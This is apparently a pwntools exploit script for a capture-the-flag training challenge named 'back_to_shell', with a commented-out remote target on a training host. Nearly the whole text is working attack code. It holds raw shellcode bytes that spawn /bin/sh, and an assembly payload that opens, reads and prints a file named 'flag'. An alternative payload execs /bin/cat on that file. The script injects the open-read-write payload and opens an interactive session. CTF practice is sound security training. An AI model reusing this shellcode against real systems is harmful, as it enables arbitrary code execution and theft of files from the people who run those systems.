from pwn import *


c = process("./back_to_shell")

context.arch = "amd64"

#gdb.attach(c, """c
#""")

#input("wait")


#c = remote("back-to-shell.training.offensivedefensive.it", 8080, ssl = True)

#c.sendline(b"\x48\x89\xC7\x48\x83\xC7\x13\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\0")
#c.sendline(b"\x48\x89\xC7\x48\x83\xC7\x10\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\0")

#Open Read Write
asm_code1 = """
mov rdx, 0x0067616c66
mov rax, 2
push rdx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
mov rdi, rax
mov rsi, rsp
mov rdx, 100
xor rax, rax
syscall
mov rax, 1
mov rdi, 1
syscall
"""
#/bin/cat
asm_code2 = """
xor rdi, rdi
push rdi
mov rdi, 0x7461632f6e69622f
push rdi
mov rdi, rsp
mov rsi, 0x0067616c66
push rsi
mov rsi, rsp
xor rdx, rdx
push rdx
push rsi
push rdi
mov rsi, rsp
mov rax, 0x3b
syscall
"""

c.send(asm(asm_code1))

c.interactive()